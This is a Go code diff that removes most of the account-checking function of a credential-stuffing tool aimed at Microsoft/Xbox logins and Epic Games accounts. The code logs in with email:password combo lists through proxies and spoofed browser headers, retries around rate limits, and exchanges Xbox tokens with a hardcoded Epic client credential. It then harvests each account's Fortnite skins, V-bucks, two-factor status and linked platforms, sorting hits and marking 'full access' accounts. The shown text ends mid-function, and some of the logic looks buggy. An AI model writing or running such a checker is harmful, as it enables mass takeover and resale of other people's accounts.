@@ -710,771 +710,878 @@ type EpicGames struct {
     client *http.Client
 }
 func CheckAccount(acc string) bool {
-    AddToCpm(1)
-    jar, err2 := cookiejar.New(nil)
-    if err2 != nil {
-        LogError(fmt.Sprintf("Failed to create cookie jar for %s: %v", acc, err2))
-        GetStats().ExportRetries(acc, "failed to create cookie jar", true)
-        return false
-    }
-    session := &http.Client{Jar: jar}
-    var proxy string
-    if UseProxies && len(Proxies) > 0 {
-        proxy = Proxies[0]
-    }
-    creds := strings.SplitN(acc, ":", 2)
-    if len(creds) != 2 {
-        LogError(fmt.Sprintf("Invalid credentials format for %s", acc))
-        GetStats().ExportBads(acc, "Invalid credentials format")
-        return false
-    }
-    email, password := creds[0], creds[1]
-    GetStats().getSessionFolder()
-    var authResp *http.Response
-    var authBody string
-    authURL := "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216"
-    authHeaders := map[string]string{
-        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
-        "accept-encoding": "gzip, deflate, br",
-        "accept": "*/*",
-        "connection": "keep-alive",
-        "accept-language": "en,en-US;q=0.9,en;q=0.8",
-        "cache-control": "max-age=0",
-        "content-type": "application/x-www-form-urlencoded",
-        "cookie": cookieValue,
-        "host": "login.live.com",
-        "origin": "https://login.live.com",
-        "referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
-        "sec-fetch-dest": "document",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-site": "same-origin",
-        "sec-fetch-user": "?1",
-        "upgrade-insecure-requests": "1",
-        "sec-ch-ua": "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\"",
-        "sec-ch-ua-mobile": "?0",
-        "sec-ch-ua-platform": "\"Windows\"",
-    }
-    maxAuthAttempts := 5
-    for attempt := 1; attempt <= maxAuthAttempts; attempt++ {
-        data := url.Values{}
-        data.Set("i13", "0")
-        data.Set("login", email)
-        data.Set("loginfmt", email)
-        data.Set("type", "11")
-        data.Set("LoginOptions", "3")
-        data.Set("lrt", "")
-        data.Set("lrtPartition", "")
-        data.Set("hisRegion", "")
-        data.Set("hisScaleUnit", "")
-        data.Set("passwd", password)
-        data.Set("ps", "2")
-        data.Set("psRNGCDefaultType", "1")
-        data.Set("psRNGCEntropy", "")
-        data.Set("psRNGCSLK", psRNGCSLKValue)
-        data.Set("canary", "")
-        data.Set("ctx", "")
-        data.Set("hpgrequestid", "")
-        data.Set("PPFT", ppftValue)
-        data.Set("PPSX", "Passp")
-        data.Set("NewUser", "1")
-        data.Set("FoundMSAs", "")
-        data.Set("fspost", "0")
-        data.Set("i21", "0")
-        data.Set("CookieDisclosure", "0")
-        data.Set("IsFidoSupported", "1")
-        data.Set("isSignupPost", "0")
-        data.Set("isRecoveryAttemptPost", "0")
-        data.Set("i19", "21648")
-        req, _ := http.NewRequest("POST", authURL, strings.NewReader(data.Encode()))
-        for key, value := range authHeaders {
-            req.Header.Set(key, value)
-        }
-        authResp, err2 = session.Do(req)
-        if err2 != nil {
-            LogError(fmt.Sprintf("Error during authentication for %s: %v", acc, err2))
-            time.Sleep(time.Duration(attempt) * time.Second)
-            continue
-        }
-        authBody, err2 = readResponseBody(authResp)
-        if err2 != nil {
-            authResp.Body.Close()
-            GetStats().ExportRetries(acc, "failed to read auth response", true)
-            return false
-        }
-        lowerAuthBody := strings.ToLower(authBody)
-        if authResp.StatusCode == 429 || strings.Contains(lowerAuthBody, "retry with a different device") {
-            authResp.Body.Close()
-            if attempt == maxAuthAttempts {
-                GetStats().ExportRetries(acc, "rate limited during authentication", false)
-                return false
-            }
-            time.Sleep(time.Duration(attempt*2) * time.Second)
-            continue
-        }
-        if authResp.StatusCode != 200 {
-            authResp.Body.Close()
-            if authResp.StatusCode >= 500 {
-                if attempt < maxAuthAttempts {
-                    time.Sleep(time.Duration(attempt) * time.Second)
-                    continue
-                }
-                GetStats().ExportRetries(acc, fmt.Sprintf("auth HTTP %d", authResp.StatusCode), false)
-                return false
-            }
-            GetStats().ExportBads(acc, fmt.Sprintf("HTTP %d", authResp.StatusCode))
-            return false
-        }
-        break
-    }
-    if authResp == nil || authBody == "" {
-        GetStats().ExportRetries(acc, "empty auth response", true)
-        return false
-    }
-    defer authResp.Body.Close()
-    debugLog("Microsoft authentication response for %s: %s", acc, authBody)
-    if strings.Contains(strings.ToLower(authBody), "abuse?mkt=") || strings.Contains(strings.ToLower(authBody), "recover?mkt=") {
-        LogError(fmt.Sprintf("Account %s got abuse/recover response in Microsoft auth, marking as bad", acc))
-        GetStats().ExportBads(acc, "abuse/recover response in Microsoft auth")
-        return false
-    } else if strings.Contains(strings.ToLower(authBody), "cancel?mkt=") || strings.Contains(strings.ToLower(authBody), "passkey?mkt=") {
-        formURL := Parse(authBody, `action="`, `"`)
-        if formURL != "" {
-            var ruURL string
-            if strings.Contains(formURL, "ru=") {
-                ruStart := strings.Index(formURL, "ru=")
-                ruValueStart := ruStart + 3
-                ruValueEnd := len(formURL)
-                if ampIdx := strings.Index(formURL[ruValueStart:], "&"); ampIdx != -1 {
-                    ruValueEnd = ruValueStart + ampIdx
-                }
-                ruURL = formURL[ruValueStart:ruValueEnd]
-                decodedRU, err2 := url.QueryUnescape(ruURL)
-                if err2 != nil {
-                    decodedRU = ruURL
-                }
-                finalRU := decodedRU + "&res=success"
-                resp2, err2 := session.Get(finalRU)
-                if err2 != nil {
-                    // fmt.Println("Error on cancel/passkey GET:", err2)
-                } else {
-                    defer resp2.Body.Close()
-                    responseBody, err2 := readResponseBody(resp2)
-                    if err2 != nil {
-                        // fmt.Println("Error reading cancel/passkey response:", err2)
-                        responseBody = ""
-                    }
-                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
-                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
-                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
-                        return false
-                    }
-                    // fmt.Println("Response from cancel/passkey GET:", responseBody)
-                    logResponseToFile(acc, "cancel?mkt_GET", responseBody)
-                }
-            } else {
-                decodedFormURL, err2 := url.QueryUnescape(formURL)
-                if err2 != nil {
-                    decodedFormURL = formURL
-                }
-                resp2, err2 := session.Get(decodedFormURL)
-                if err2 != nil {
-                    fmt.Println("Error on cancel/passkey POST:", err2)
-                } else {
-                    defer resp2.Body.Close()
-                    responseBody, err2 := readResponseBody(resp2)
-                    if err2 != nil {
-                        fmt.Println("Error reading cancel/passkey response:", err2)
-                        responseBody = ""
-                    }
-                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
-                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey POST, marking as bad", acc))
-                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey POST")
-                        return false
-                    }
-                    fmt.Println("Response from cancel/passkey POST:", responseBody)
-                    logResponseToFile(acc, "cancel?mkt_POST", responseBody)
-                }
-            }
-        }
-    }
-    for _, keyword := range FailureKeywords {
-        if strings.Contains(strings.ToLower(authBody), strings.ToLower(keyword)) {
-            GetStats().ExportBads(acc, keyword)
-            return false
-        }
-    }
-    if strings.Contains(strings.ToLower(authBody), "cancel?mkt=") || strings.Contains(strings.ToLower(authBody), "passkey?mkt=") {
-        formURL := Parse(authBody, `action="`, `"`)
-        if formURL != "" {
-            var ruURL string
-            if strings.Contains(formURL, "ru=") {
-                ruStart := strings.Index(formURL, "ru=")
-                ruValueStart := ruStart + 3
-                ruValueEnd := len(formURL)
-                if ampIdx := strings.Index(formURL[ruValueStart:], "&"); ampIdx != -1 {
-                    ruValueEnd = ruValueStart + ampIdx
-                }
-                ruURL = formURL[ruValueStart:ruValueEnd]
-                decodedRU, err2 := url.QueryUnescape(ruURL)
-                if err2 != nil {
-                    decodedRU = ruURL
-                }
-                finalRU := decodedRU + "&res=success"
-                resp2, err2 := session.Get(finalRU)
-                if err2 != nil {
-                    // fmt.Println("Error on cancel/passkey GET:", err2)
-                } else {
-                    defer resp2.Body.Close()
-                    responseBody, err2 := readResponseBody(resp2)
-                    if err2 != nil {
-                        // fmt.Println("Error reading cancel/passkey response:", err2)
-                        responseBody = ""
-                    }
-                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
-                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
-                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
-                        return false
-                    }
-                    // fmt.Println("Response from cancel/passkey GET:", responseBody)
-                    logResponseToFile(acc, "cancel?mkt_GET", responseBody)
-                }
-            } else {
-                decodedFormURL, err2 := url.QueryUnescape(formURL)
-                if err2 != nil {
-                    decodedFormURL = formURL
-                }
-                resp2, err2 := session.Get(decodedFormURL)
-                if err2 != nil {
-                    // fmt.Println("Error on cancel/passkey GET:", err2)
-                } else {
-                    defer resp2.Body.Close()
-                    responseBody, err2 := readResponseBody(resp2)
-                    if err2 != nil {
-                        // fmt.Println("Error reading cancel/passkey response:", err2)
-                        responseBody = ""
-                    }
-                    if strings.Contains(strings.ToLower(responseBody), "abuse?mkt=") || strings.Contains(strings.ToLower(responseBody), "recover?mkt=") {
-                        LogError(fmt.Sprintf("Account %s got abuse/recover response in cancel/passkey GET, marking as bad", acc))
-                        GetStats().ExportBads(acc, "abuse/recover response in cancel/passkey GET")
-                        return false
-                    }
-                    // fmt.Println("Response from cancel/passkey GET:", responseBody)
-                    logResponseToFile(acc, "cancel?mkt_GET", responseBody)
-                }
-            }
-        }
-    }
-    if authResp == nil || authResp.StatusCode != 200 {
-        LogError(fmt.Sprintf("Microsoft authentication failed for %s - no valid response", acc))
-        GetStats().ExportBads(acc, "Microsoft authentication failed")
-        return false
-    }
-    AddToMsHits(1)
-    transport := &http.Transport{
-        DisableCompression: false,
-    }
-    if proxy != "" {
-        proxyURL, err2 := url.Parse(proxy)
-        if err2 == nil {
-            transport.Proxy = http.ProxyURL(proxyURL)
-        }
-    }
-    epicGamesClient := &http.Client{
-        Transport: transport,
-        Jar: jar,
-        Timeout: 30 * time.Second,
-    }
-    epicGames := &EpicGames{
-        client: epicGamesClient,
-    }
-    var xboxToken string
-    maxXboxRetries := 3
-    for attempt := 0; attempt < maxXboxRetries; attempt++ {
-        xboxAuthURL := "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
-        epicGames.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
-            return http.ErrUseLastResponse
-        }
-        defer func() { epicGames.client.CheckRedirect = nil }()
-        resp22, err22 := epicGames.client.Get(xboxAuthURL)
-        if err22 != nil {
-            if resp22 == nil {
-                LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err22))
-                GetStats().ExportBads(acc, "Failed to get Xbox token - initial GET failed")
-                return false
-            }
-        }
-        defer resp22.Body.Close()
-        location, err2 := resp22.Location()
-        if err2 != nil {
-            body, err2Read := readResponseBody(resp22)
-            if err2Read != nil {
-                LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2Read))
-                GetStats().ExportBads(acc, "Failed to get Xbox token - error reading response body")
-                return false
-            }
-            if strings.Contains(strings.ToLower(body), "abuse?mkt=") || strings.Contains(strings.ToLower(body), "recover?mkt=") {
-                LogError(fmt.Sprintf("Account %s got abuse/recover response, marking as bad", acc))
-                GetStats().ExportBads(acc, "abuse/recover response")
-                return false
-            } else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
-                if ru := Parse(body, "ru=", "\""); ru != "" {
-                    unquotedRU, _ := url.QueryUnescape(ru)
-                    resp22, err2 = epicGames.client.Get(unquotedRU)
-                    if err2 != nil && resp22 == nil {
-                        LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
-                        GetStats().ExportBads(acc, "Failed to get Xbox token - ru GET request failed")
-                        return false
-                    }
-                    defer resp22.Body.Close()
-                    location, err2 = resp22.Location()
-                    if err2 != nil {
-                        LogError(fmt.Sprintf("Failed to get Xbox token for %s: %v", acc, err2))
-                        GetStats().ExportBads(acc, "Failed to get Xbox token - no location from ru redirect")
-                        return false
-                    }
-                }
-            } else {
-                LogError(fmt.Sprintf("Failed to get Xbox token for %s: no location and no cancel/passkey in body", acc))
-                GetStats().ExportBads(acc, "Failed to get Xbox token - no location or cancel/passkey")
-                return false
-            }
-        }
-        if location == nil {
-            LogError(fmt.Sprintf("Failed to get Xbox token for %s: location was nil", acc))
-            GetStats().ExportBads(acc, "Failed to get Xbox token - location was nil")
-            return false
-        }
-        xboxToken = location.Query().Get("code")
-        if xboxToken == "" {
-            LogError(fmt.Sprintf("Failed to get Xbox token for %s: token not found in redirect", acc))
-            GetStats().ExportBads(acc, "Failed to get Xbox token - token not found in redirect")
-            return false
-        }
-        break
-    }
-    transport = &http.Transport{
-        DisableCompression: false,
-    }
-    if proxy != "" {
-        proxyURL, err2 := url.Parse(proxy)
-        if err2 == nil {
-            transport.Proxy = http.ProxyURL(proxyURL)
-        }
-    }
-    epicGamesRetryClient := &http.Client{
-        Transport: transport,
-        Jar: jar,
-        Timeout: 30 * time.Second,
-    }
-    epicGamesRetry := &EpicGames{
-        client: epicGamesRetryClient,
-    }
-    var xboxAuthURL string = "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup"
-    var location *url.URL
-    var resp22 *http.Response
-    epicGamesRetry.client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
-        return http.ErrUseLastResponse
-    }
-    defer func() { epicGamesRetry.client.CheckRedirect = nil }()
-    var resp2 *http.Response
-    resp2, err2 = epicGamesRetry.client.Get(xboxAuthURL)
-    if err2 != nil {
-        if resp2 == nil {
-            LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
-            GetStats().ExportBads(acc, "Failed to get Xbox token for retry")
-            return false
-        }
-    }
-    defer resp2.Body.Close()
-    location, err2 = resp2.Location()
-    if err2 != nil {
-        var body string
-        var err2Read error
-        body, err2Read = readResponseBody(resp2)
-        if err2Read != nil {
-            LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2Read))
-            GetStats().ExportBads(acc, "Failed to get Xbox token for retry - error reading response body")
-            return false
-        }
-        if strings.Contains(strings.ToLower(body), "abuse?mkt=") || strings.Contains(strings.ToLower(body), "recover?mkt=") {
-            LogError(fmt.Sprintf("Account %s got abuse/recover response on retry, marking as bad", acc))
-            GetStats().ExportBads(acc, "abuse/recover response on retry")
-            return false
-        } else if strings.Contains(body, "cancel?mkt=") || strings.Contains(body, "passkey?mkt=") {
-            if ru := Parse(body, "ru=", "\""); ru != "" {
-                unquotedRU, _ := url.QueryUnescape(ru)
-                resp2, err2 = epicGamesRetry.client.Get(unquotedRU)
-                if err2 != nil && resp2 == nil {
-                    LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
-                    GetStats().ExportBads(acc, "Failed to get Xbox token for retry - ru GET request failed")
-                    return false
-                }
-                defer resp22.Body.Close()
-                location, err2 = resp22.Location()
-                if err2 != nil {
-                    LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: %v", acc, err2))
-                    GetStats().ExportBads(acc, "Failed to get Xbox token for retry - no location from ru redirect")
-                    return false
-                }
-            }
-        } else {
-            LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: no location and no cancel/passkey in body", acc))
-            GetStats().ExportBads(acc, "Failed to get Xbox token for retry - no location or cancel/passkey")
-            return false
-        }
-    }
-    if location == nil {
-        LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: location was nil", acc))
-        GetStats().ExportBads(acc, "Failed to get Xbox token for retry - location was nil")
-        return false
-    }
-    xboxToken = location.Query().Get("code")
-    if xboxToken == "" {
-        LogError(fmt.Sprintf("Failed to get Xbox token for retry for %s: token not found in redirect", acc))
-        GetStats().ExportBads(acc, "Failed to get Xbox token for retry - token not found in redirect")
-        return false
-    }
-    data := url.Values{}
-    data.Set("grant_type", "external_auth")
-    data.Set("external_auth_type", "xbl")
-    data.Set("external_auth_token", xboxToken)
-    req, _ := http.NewRequest("POST", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token", strings.NewReader(data.Encode()))
-    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-    req.Header.Set("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=")
-    req.Header.Set("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36")
-    for i := 0; i < 3; i++ {
-        resp2, err2 = http.DefaultClient.Do(req)
-        if err2 == nil {
-            break
-        }
-        time.Sleep(5 * time.Second)
-    }
-    if err2 != nil {
-        LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
-        GetStats().ExportRetries(acc, err2.Error(), true)
-        return false
-    }
-    defer resp2.Body.Close()
-    var body string
-    body, err2 = readResponseBody(resp2)
-    if err2 != nil {
-        LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
-        GetStats().ExportRetries(acc, err2.Error(), true)
-        return false
-    }
-    bodyStr := body
-    debugLog("Xbox token exchange response: %s", bodyStr)
-    var accountID, displayName, accessToken string
-    if strings.Contains(bodyStr, "errors.com.epicgames.account.identity_provider.api_error") {
-        accountID = "retry"
-        displayName = "retry"
-        accessToken = "retry"
-    } else if strings.Contains(bodyStr, "errors.com.epicgames.account.ext_auth.invalid_external_auth_token") {
-        accountID = "invalid"
-        displayName = "invalid"
-        accessToken = "invalid"
-    } else if strings.Contains(bodyStr, "errors.com.epicgames.account.account_not_active") || strings.Contains(bodyStr, "sorry the account you are using is not active") {
-        accountID = "inactive"
-        displayName = "inactive"
-        accessToken = "inactive"
-    } else if strings.Contains(bodyStr, "correctiveAction\":\"DATE_OF_BIRTH") || strings.Contains(bodyStr, "account_review_details_required") {
-        accountID = "headless"
-        displayName = "headless"
-        accessToken = "headless"
-        CurrentAccountHeadless = true
-    } else {
-        var result map[string]interface{}
-        if err2 := json.Unmarshal([]byte(bodyStr), &result); err2 != nil {
-            LogError(fmt.Sprintf("Failed to parse Xbox exchange response for %s: %v", acc, err2))
-            GetStats().ExportRetries(acc, "Failed to parse Xbox exchange response", true)
-            return false
-        }
-        if accountIDVal, ok := result["account_id"]; ok && accountIDVal != nil {
-            accountID, _ = accountIDVal.(string)
-        } else {
-            accountID = ""
-        }
-        if displayNameVal, ok := result["displayName"]; ok && displayNameVal != nil {
-            displayName, _ = displayNameVal.(string)
-        } else {
-            displayName = ""
-        }
-        if accessTokenVal, ok := result["access_token"]; ok && accessTokenVal != nil {
-            accessToken, _ = accessTokenVal.(string)
-        } else {
-            accessToken = ""
-        }
-    }
-    if err2 != nil {
-        LogError(fmt.Sprintf("Xbox token exchange failed for %s: %v", acc, err2))
-        GetStats().ExportRetries(acc, err2.Error(), true)
-        return false
-    }
-    if accountID == "retry" {
-        LogError(fmt.Sprintf("Retrying account %s due to identity provider error", acc))
-        GetStats().ExportRetries(acc, "identity provider error", false)
-        return false
-    }
-    if accountID == "invalid" {
-        LogError(fmt.Sprintf("Account %s has invalid external auth token", acc))
-        GetStats().ExportBads(acc, "Invalid external auth token")
-        return false
-    }
-    if accountID == "inactive" {
-        LogError(fmt.Sprintf("Account %s is inactive", acc))
-        GetStats().ExportBads(acc, "Inactive account")
-        return false
-    }
-    if accountID == "headless" {
-        AddToHeadless(1)
-        CurrentAccountHeadless = true
-        GetStats().ExportHeadless(acc, "Requires DOB", "none", "none", "N/A", 0, 0, false)
-        return true
-    }
-    if accessToken == "" {
-        LogError(fmt.Sprintf("Received empty access token for %s", acc))
-        GetStats().ExportRetries(acc, "empty access token", true)
-        return false
-    }
-    var accountData map[string]interface{}
-    results := make(map[string]interface{})
-    var wg sync.WaitGroup
-    var mu sync.Mutex
-    client := &http.Client{Timeout: 10 * time.Second}
-    fetch := func(url, method string, headers map[string]string, key string) {
-        defer wg.Done()
-        var req *http.Request
-        var err2 error
-        if method == "POST" {
-            req, err2 = http.NewRequest("POST", url, strings.NewReader("{}"))
-        } else {
-            req, err2 = http.NewRequest("GET", url, nil)
-        }
-        if err2 != nil {
-            return
-        }
-        for h, v := range headers {
-            req.Header.Set(h, v)
-        }
-        resp2, err2 := client.Do(req)
-        if err2 != nil {
-            return
-        }
-        defer resp2.Body.Close()
-        body, err2 := readResponseBody(resp2)
-        if err2 != nil {
-            return
-        }
-        mu.Lock()
-        results[key] = []byte(body)
-        mu.Unlock()
-    }
-    wg.Add(6)
-    go fetch("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/"+accountID, "GET", map[string]string{"Authorization": "Bearer " + accessToken}, "account")
-    go fetch("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/"+accountID+"/client/QueryProfile?profileId=athena&rvn=-1", "POST", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "fortnite")
-    go fetch("https://statsproxy-public-service-live.ol.epicgames.com/statsproxy/api/statsv2/account/"+accountID, "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "stats")
-    go fetch("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/"+accountID+"/client/QueryProfile?profileId=common_core&rvn=-1", "POST", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "vbucks")
-    go fetch("https://entitlement-public-service-prod08.ol.epicgames.com/entitlement/api/account/"+accountID+"/entitlements", "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "stw")
-    go fetch("https://account-public-service-prod.ol.epicgames.com/account/api/public/account/"+accountID+"/externalAuths", "GET", map[string]string{"Authorization": "Bearer " + accessToken, "Content-Type": "application/json"}, "linked")
-    wg.Wait()
-    processedResults := make(map[string]interface{})
-    debugLog("Processing account data results for account: %s", accountID)
-    var epicEmail string = "none"
-    var tfaEnabled string = "unknown"
-    var tfaMethod string = ""
-    var emailVerified string = "unknown"
-    var skinsList string = ""
-    var rawSkinsList []string
-    var skinCount int = 0
-    var lastPlayed string = "N/A"
-    var totalVbucks int = 0
-    var hasStw bool = false
-    var hasPsn bool = false
-    var hasNintendo bool = false
-    if accountData, ok := results["account"]; ok {
-        var account map[string]interface{}
-        json.Unmarshal(accountData.([]byte), &account)
-        if email, ok := account["email"].(string); ok {
-            epicEmail = email
-        }
-        if tfa, ok := account["tfaEnabled"].(bool); ok {
-            tfaEnabled = strings.ToLower(fmt.Sprintf("%t", tfa))
-        }
-        if tfaMethodVal, ok := account["twoFactorMethod"]; ok && tfaMethodVal != nil {
-            if method, ok := tfaMethodVal.(string); ok {
-                tfaMethod = strings.ToLower(method)
-            }
-        } else if authMethod, ok := account["twoFactorAuthMethod"]; ok && authMethod != nil {
-            if method, ok := authMethod.(string); ok {
-                tfaMethod = strings.ToLower(method)
-            }
-        } else if mfaVal, ok := account["mfaMethod"]; ok && mfaVal != nil {
-            if method, ok := mfaVal.(string); ok {
-                tfaMethod = strings.ToLower(method)
-            }
-        } else if tfaProvider, ok := account["tfaProvider"]; ok && tfaProvider != nil {
-            if method, ok := tfaProvider.(string); ok {
-                tfaMethod = strings.ToLower(method)
-            }
-        } else if authType, ok := account["twoFactorAuthType"]; ok && authType != nil {
-            if method, ok := authType.(string); ok {
-                tfaMethod = strings.ToLower(method)
-            }
-        } else if authType2, ok := account["tfaType"]; ok && authType2 != nil {
-            if method, ok := authType2.(string); ok {
-                tfaMethod = strings.ToLower(method)
-            }
-        }
-        if verified, ok := account["emailVerified"].(bool); ok {
-            emailVerified = strings.ToLower(fmt.Sprintf("%t", verified))
-        }
-        if displayNameVal, ok := account["displayName"].(string); ok {
-            displayName = displayNameVal
-        }
-    }
-    processedResults["epic_email"] = epicEmail
-    processedResults["tfa_enabled"] = tfaEnabled
-    processedResults["email_verified"] = emailVerified
-    processedResults["displayName"] = displayName
-    if fortniteData, ok := results["fortnite"]; ok {
-        fortniteText := string(fortniteData.([]byte))
-        var fortniteJSON map[string]interface{}
-        if json.Unmarshal([]byte(fortniteText), &fortniteJSON) == nil {
-            if profileChanges, ok := fortniteJSON["profileChanges"].([]interface{}); ok && len(profileChanges) > 0 {
-                if change, ok := profileChanges[0].(map[string]interface{}); ok {
-                    if profile, ok := change["profile"].(map[string]interface{}); ok {
-                        if items, ok := profile["items"].(map[string]interface{}); ok {
-                            for _, item := range items {
-                                if itemMap, ok := item.(map[string]interface{}); ok {
-                                    if templateID, ok := itemMap["templateId"].(string); ok {
-                                        if strings.HasPrefix(templateID, "AthenaCharacter:") {
-                                            rawSkinsList = append(rawSkinsList, templateID)
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                        if stats, ok := profile["stats"].(map[string]interface{}); ok {
-                            if attributes, ok := stats["attributes"].(map[string]interface{}); ok {
-                                if lastMatch, ok := attributes["last_match_end_datetime"].(string); ok {
-                                    if strings.Contains(lastMatch, "T") {
-                                        lastPlayed = strings.Split(lastMatch, "T")[0]
-                                    } else {
-                                        lastPlayed = lastMatch
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-        uniqueSkins := make(map[string]bool)
-        for _, skin := range rawSkinsList {
-            uniqueSkins[skin] = true
-        }
-        skinCount = len(uniqueSkins)
-        var mappedSkins []string
-        for skin := range uniqueSkins {
-            skinID := strings.ToLower(strings.TrimPrefix(skin, "AthenaCharacter:"))
-            if name, ok := Mapping[skinID]; ok {
-                mappedSkins = append(mappedSkins, name)
-            } else {
-                // Fallback for unmapped common skins
-                if strings.Contains(skinID, "cid_defaultoutfit") {
-                    mappedSkins = append(mappedSkins, "Default Outfit")
-                } else {
-                    mappedSkins = append(mappedSkins, strings.TrimPrefix(skin, "AthenaCharacter:"))
-                }
-            }
-        }
-        skinsList = strings.Join(mappedSkins, ", ")
-    }
-    processedResults["skins_list"] = skinsList
-    processedResults["raw_skins_list"] = rawSkinsList
-    processedResults["skin_count"] = skinCount
-    processedResults["last_played"] = lastPlayed
-    totalVbucks = 0
-    if vbucksData, ok := results["vbucks"]; ok {
-        var vbucksJSON map[string]interface{}
-        if json.Unmarshal(vbucksData.([]byte), &vbucksJSON) == nil {
-            if profileChanges, ok := vbucksJSON["profileChanges"].([]interface{}); ok {
-                for _, change := range profileChanges {
-                    if changeMap, ok := change.(map[string]interface{}); ok {
-                        if profile, ok := changeMap["profile"].(map[string]interface{}); ok {
-                            if items, ok := profile["items"].(map[string]interface{}); ok {
-                                for _, item := range items {
-                                    if itemMap, ok := item.(map[string]interface{}); ok {
-                                        if templateID, ok := itemMap["templateId"].(string); ok {
-                                            if strings.HasPrefix(templateID, "Currency:Mtx") {
-                                                if quantity, ok := itemMap["quantity"].(float64); ok {
-                                                    totalVbucks += int(quantity)
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-    processedResults["total_vbucks"] = totalVbucks
-    hasStw = false
-    if stwData, ok := results["stw"]; ok {
-        stwText := string(stwData.([]byte))
-        hasStw = strings.Contains(stwText, "entitlementName\":\"Fortnite_Founder\"")
-    }
-    processedResults["has_stw"] = hasStw
-    if linkedData, ok := results["linked"]; ok {
-        linkedText := string(linkedData.([]byte))
-        hasPsn = !strings.Contains(linkedText, "\"type\":\"psn\",")
-        hasNintendo = !strings.Contains(linkedText, "\"type\":\"nintendo\",")
-    }
-    processedResults["has_psn"] = hasPsn
-    processedResults["has_nintendo"] = hasNintendo
-    accountData = processedResults
-    epicEmail = accountData["epic_email"].(string)
-    tfaEnabled = accountData["tfa_enabled"].(string)
-    emailVerified = accountData["email_verified"].(string)
-    skinsList = accountData["skins_list"].(string)
-    rawSkinsList = accountData["raw_skins_list"].([]string)
-    skinCount = accountData["skin_count"].(int)
-    lastPlayed = accountData["last_played"].(string)
-    totalVbucks = accountData["total_vbucks"].(int)
-    hasStw = accountData["has_stw"].(bool)
-    hasPsn = accountData["has_psn"].(bool)
-    hasNintendo = accountData["has_nintendo"].(bool)
-    isFA := strings.ToLower(epicEmail) == strings.ToLower(email)
-    _, ogSkinsFound, rareSkinsFound := checkRareSkins(skinsList, rawSkinsList)
-    ExportLock.Lock()
-    AddToHits(1)
-    GetStats().ExportHit(acc, displayName, epicEmail, tfaMethod, lastPlayed, tfaEnabled, skinsList, skinCount, totalVbucks, hasStw, CurrentAccountHeadless, ogSkinsFound, rareSkinsFound)
-    if isFA {
